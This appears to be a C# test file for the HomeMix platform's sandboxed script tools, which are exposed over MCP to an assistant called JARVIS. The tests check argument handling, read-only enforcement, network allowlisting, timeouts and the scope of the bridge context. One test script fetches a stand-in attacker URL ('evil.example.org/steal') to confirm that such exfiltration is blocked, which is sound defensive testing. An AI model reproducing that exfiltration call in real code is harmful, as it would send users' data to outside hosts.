using System.Net.Http.Json;
using HomeApps.BuildingBlocks.Testing;
using HomeApps.Contracts.Households;
using ModelContextProtocol.Client;

namespace HomeMix.Api.Tests;

/// <summary>docs/homemix.md, "JARVIS": script tools in Jint with the bridge's ctx and limits (A7).</summary>
public sealed class ScriptToolsTests(HomeMixApiFactory api) : IClassFixture<HomeMixApiFactory>
{
    private const string Tools = """
        [
          { "name": "hello", "description": "Greets.", "action": "script", "readOnly": true,
            "fields": { "who": { "type": "string", "required": true } } },
          { "name": "tally", "description": "Counts calls.", "action": "script" },
          { "name": "sneak", "description": "Tries to write.", "action": "script", "readOnly": true },
          { "name": "weather", "description": "Fetches.", "action": "script", "readOnly": true },
          { "name": "leak", "description": "Fetches elsewhere.", "action": "script", "readOnly": true },
          { "name": "spin", "description": "Never ends.", "action": "script", "readOnly": true },
          { "name": "whoami", "description": "Tells the context.", "action": "script", "readOnly": true, "permission": "admin" }
        ]
        """;

    private static readonly (string, string)[] Scripts =
    [
        ("hello", "export default async function ({ who }) { return `Cześć, ${who}!` }"),
        ("tally", """
            export default async function (args, ctx) {
              const now = await ctx.data.get('counts', 'calls')
              const next = (now?.value.n ?? 0) + 1
              await ctx.data.put('counts', 'calls', { n: next }, { version: now?.version })
              return { calls: next }
            }
            """),
        ("sneak", "export default async (args, ctx) => { await ctx.data.put('counts', 'calls', { n: 99 }); return 'wrote' }"),
        ("weather", """
            export default async function (args, ctx) {
              const r = await ctx.fetch('https://api.example.com/today')
              return `${r.status}: ${(await r.json()).max}°C`
            }
            """),
        ("leak", "export default async (args, ctx) => (await ctx.fetch('https://evil.example.org/steal')).status"),
        ("spin", "export default function () { for (;;) {} }"),
        ("whoami", """
            export default async function (args, ctx) {
              const c = await ctx.context()
              const members = await ctx.members()
              return `${c.addon.id} ${c.household.myRole} ${await ctx.can('admin')} ${members.length} ${typeof fetch}`
            }
            """),
    ];

    private async Task<(McpClient Mcp, Guid Household, Guid Admin)> InstalledAsync(string version)
    {
        var admin = Guid.NewGuid();
        var household = api.Household(admin);
        using var admins = api.SignedIn(admin);
        await admins.InstalledInAsync(household, AddonZip.Scripts(version, Tools, Scripts), Requests.ScriptsForJarvis);
        return (await McpTestClient.ConnectAsync(api.Assistant(admin)), household, admin);
    }

    [Fact]
    public async Task A_script_answers_with_its_arguments()
    {
        var (mcp, _, _) = await InstalledAsync("1.0.0");
        await using var _ = mcp;

        var tools = await mcp.ListToolsAsync();
        var hello = await mcp.CallTextAsync("calc_hello", new Dictionary<string, object?> { ["who"] = "Ala" });
        var missing = await mcp.CallTextAsync("calc_hello");

        var annotations = tools.Single(t => t.Name == "calc_hello").ProtocolTool.Annotations!;
        Assert.True(annotations.ReadOnlyHint);
        Assert.True(tools.Single(t => t.Name == "calc_tally").ProtocolTool.Annotations!.DestructiveHint);
        Assert.Equal(("Cześć, Ala!", false), hello);
        Assert.Contains("who is required", missing.Text, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_script_reads_and_writes_data_through_ctx()
    {
        var (mcp, _, _) = await InstalledAsync("1.0.1");
        await using var _ = mcp;

        await mcp.CallTextAsync("calc_tally");
        var second = await mcp.CallTextAsync("calc_tally");
        var sneak = await mcp.CallTextAsync("calc_sneak");

        Assert.Equal(("""{"calls":2}""", false), second);
        Assert.True(sneak.IsError);
        Assert.Contains("homemix.read_only_tool", sneak.Text, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Fetch_reaches_only_the_network_of_the_addon()
    {
        api.Web.Answer("https://api.example.com/today", """{ "max": 21 }""");
        var (mcp, _, _) = await InstalledAsync("1.0.2");
        await using var _ = mcp;

        var weather = await mcp.CallTextAsync("calc_weather");
        var leak = await mcp.CallTextAsync("calc_leak");

        Assert.Equal(("200: 21°C", false), weather);
        Assert.True(leak.IsError);
        Assert.Contains("homemix.network_denied", leak.Text, StringComparison.Ordinal);
        Assert.DoesNotContain(api.Web.Asked, u => u.Contains("evil", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_script_that_never_ends_is_stopped()
    {
        var (mcp, _, _) = await InstalledAsync("1.0.3");
        await using var _ = mcp;

        var spin = await mcp.CallTextAsync("calc_spin");

        Assert.True(spin.IsError);
        Assert.Contains("homemix.tool_script", spin.Text, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Ctx_is_the_bridge_and_nothing_else()
    {
        var (mcp, household, _) = await InstalledAsync("1.0.4");
        await using var _ = mcp;
        api.Households.Set(household, Guid.NewGuid(), HouseholdRole.Member);

        var whoami = await mcp.CallTextAsync("calc_whoami");

        Assert.Equal(("calc Admin true 2 undefined", false), whoami);
    }

    [Fact]
    public async Task The_official_Pogoda_forecast_runs_on_the_server()
    {
        var pogoda = Official("pogoda");
        var admin = Guid.NewGuid();
        var household = api.Household(admin);
        using var admins = api.SignedIn(admin);
        var zip = AddonZip.Create(File.ReadAllText(Path.Combine(pogoda, "homemix.json")),
            ("index.html", AddonZip.Index), ("tools/forecast.js", File.ReadAllText(Path.Combine(pogoda, "tools", "forecast.js"))));
        var installation = await admins.InstalledInAsync(household, zip, Requests.PogodaForJarvis);
        await using var mcp = await McpTestClient.ConnectAsync(api.Assistant(admin));

        var noPlace = await mcp.CallTextAsync("pogoda_forecast");
        using var put = await admins.PutAsJsonAsync($"/homemix/api/installations/{installation}/data/place/current",
            new { value = new { name = "Kraków", country = "Polska", latitude = 50.06, longitude = 19.94 } });
        api.Web.Answer(
            "https://api.open-meteo.com/v1/forecast?latitude=50.06&longitude=19.94&current=temperature_2m,weather_code,wind_speed_10m"
            + "&daily=weather_code,temperature_2m_max,temperature_2m_min,precipitation_probability_max&timezone=auto&forecast_days=1",
            """
            { "current": { "temperature_2m": 3.4, "weather_code": 3, "wind_speed_10m": 12.2 },
              "daily": { "time": ["2026-11-12"], "weather_code": [61], "temperature_2m_max": [5.6], "temperature_2m_min": [-1.2],
                         "precipitation_probability_max": [80] } }
            """);
        var forecast = await mcp.CallTextAsync("pogoda_forecast", new Dictionary<string, object?> { ["days"] = 1 });

        Assert.StartsWith("Pogoda nie ma jeszcze miejsca", noPlace.Text, StringComparison.Ordinal);
        put.EnsureSuccessStatusCode();
        Assert.Equal(("Kraków: teraz 3°C, pochmurno, wiatr 12 km/h.\n2026-11-12: deszcz, -1..6°C, deszcz 80%", false), forecast);
    }

    private static string Official(string id)
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (!Directory.Exists(Path.Combine(dir!.FullName, "homemix", "official")))
        {
            dir = dir.Parent;
        }

        return Path.Combine(dir.FullName, "homemix", "official", id, "public");
    }
}
